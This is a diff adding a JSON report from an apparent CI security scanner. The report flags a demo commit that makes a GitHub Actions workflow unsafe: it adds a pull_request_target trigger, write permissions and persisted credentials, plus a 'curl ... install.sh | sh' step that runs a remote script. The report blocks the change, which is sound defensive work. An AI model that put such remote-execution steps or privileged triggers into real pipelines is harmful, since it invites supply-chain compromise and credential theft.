@@ -1,0 +1,162 @@
+{
+  "base_ref": "f5232c951115ad94f350d5272499e601a95d5e75",
+  "base_sha": "f5232c951115ad94f350d5272499e601a95d5e75",
+  "changed_files": [
+    {
+      "added_lines": 11,
+      "binary": false,
+      "deleted_lines": 2,
+      "old_path": null,
+      "path": ".github/workflows/ci.yml",
+      "status": "M"
+    }
+  ],
+  "command_results": [],
+  "findings": [
+    {
+      "disposition": "review",
+      "evidence": null,
+      "file": ".github/workflows/ci.yml",
+      "line": null,
+      "message": ".github/workflows/ci.yml changes repository automation and its effective permissions.",
+      "recommendation": "Review the event trigger, permissions, secrets, external actions, and shell steps.",
+      "rule_id": "PL-GHA-001",
+      "severity": "warning",
+      "tags": [
+        "github-actions",
+        "permissions"
+      ],
+      "title": "GitHub Actions workflow changed"
+    },
+    {
+      "disposition": "deny",
+      "evidence": "pull_request_target:",
+      "file": ".github/workflows/ci.yml",
+      "line": 3,
+      "message": "pull_request_target can expose privileged context to untrusted pull-request data.",
+      "recommendation": "Use pull_request with read-only permissions, or isolate all untrusted checkout and input handling.",
+      "rule_id": "PL-GHA-003",
+      "severity": "error",
+      "tags": [
+        "github-actions",
+        "untrusted-input"
+      ],
+      "title": "pull_request_target trigger added"
+    },
+    {
+      "disposition": "deny",
+      "evidence": "contents: write",
+      "file": ".github/workflows/ci.yml",
+      "line": 5,
+      "message": "A GitHub Actions write permission was added: contents: write",
+      "recommendation": "Use read-only permissions by default and grant one narrow write permission only where required.",
+      "rule_id": "PL-GHA-002",
+      "severity": "error",
+      "tags": [
+        "github-actions",
+        "least-privilege"
+      ],
+      "title": "Write permission added"
+    },
+    {
+      "disposition": "review",
+      "evidence": "actions/checkout@v4",
+      "file": ".github/workflows/ci.yml",
+      "line": 10,
+      "message": "actions/checkout@v4 uses a mutable tag or branch.",
+      "recommendation": "Pin third-party actions to a reviewed 40-character commit SHA.",
+      "rule_id": "PL-GHA-007",
+      "severity": "warning",
+      "tags": [
+        "github-actions",
+        "supply-chain"
+      ],
+      "title": "External action is not pinned by commit SHA"
+    },
+    {
+      "disposition": "deny",
+      "evidence": "persist-credentials: true",
+      "file": ".github/workflows/ci.yml",
+      "line": 12,
+      "message": "actions/checkout credentials are explicitly persisted in the working copy.",
+      "recommendation": "Set persist-credentials to false unless a reviewed write step requires it.",
+      "rule_id": "PL-GHA-004",
+      "severity": "error",
+      "tags": [
+        "github-actions",
+        "credentials"
+      ],
+      "title": "Git credentials persisted"
+    },
+    {
+      "disposition": "deny",
+      "evidence": "- run: curl https://example.invalid/install.sh | sh",
+      "file": ".github/workflows/ci.yml",
+      "line": 13,
+      "message": "The workflow downloads content and executes it directly in a shell.",
+      "recommendation": "Download a pinned artifact, verify its digest, and execute only after review.",
+      "rule_id": "PL-GHA-006",
+      "severity": "error",
+      "tags": [
+        "github-actions",
+        "supply-chain"
+      ],
+      "title": "Remote script execution added"
+    },
+    {
+      "disposition": "review",
+      "evidence": "- run: curl https://example.invalid/install.sh | sh",
+      "file": ".github/workflows/ci.yml",
+      "line": 13,
+      "message": "A command-line network client was added.",
+      "recommendation": "Document the destination, data sent, timeout, retry policy, and trust boundary.",
+      "rule_id": "PL-NET-001",
+      "severity": "warning",
+      "tags": [
+        "network",
+        "capability"
+      ],
+      "title": "Network capability added"
+    }
+  ],
+  "generated_at": "2026-08-16T15:05:58Z",
+  "head_ref": "5004d7fba488e97112b6e646d4458aa730d78f2b",
+  "head_sha": "5004d7fba488e97112b6e646d4458aa730d78f2b",
+  "metadata": {
+    "base_commit": {
+      "author_name": "PatchLab Demo",
+      "authored_at": "2026-08-16T15:05:58Z",
+      "commit": "f5232c951115ad94f350d5272499e601a95d5e75",
+      "subject": "add read-only workflow",
+      "tree": "e69dd82ac6b7f3bb126d7bfbdcbc06f5036d0d67"
+    },
+    "config_location": "base:patchlab.toml",
+    "config_sha256": "d670071bbe55badeed997c15f229cbf07deb23c646f447f91775eee493b3835c",
+    "config_source": "base",
+    "environment": "local",
+    "fail_on_review": false,
+    "head_commit": {
+      "author_name": "PatchLab Demo",
+      "authored_at": "2026-08-16T15:05:58Z",
+      "commit": "5004d7fba488e97112b6e646d4458aa730d78f2b",
+      "subject": "add unsafe privileged workflow",
+      "tree": "0221a588e94bcac480fb3237fba8c9fcdace6dd5"
+    },
+    "human_review_required": true,
+    "platform": "Linux-6.18.35-x86_64-with-glibc2.41",
+    "python": "3.13.5"
+  },
+  "outcome": "fail",
+  "project_name": "patchlab-blocked-workflow-demo",
+  "repository": "https://github.com/patchlab/examples.git",
+  "schema_version": "1.0.0",
+  "summary": {
+    "blocking_findings": 4,
+    "changed_files": 1,
+    "commands": 0,
+    "commands_passed": 0,
+    "findings": 7,
+    "review_findings": 3
+  },
+  "tool_version": "0.1.0"
+}
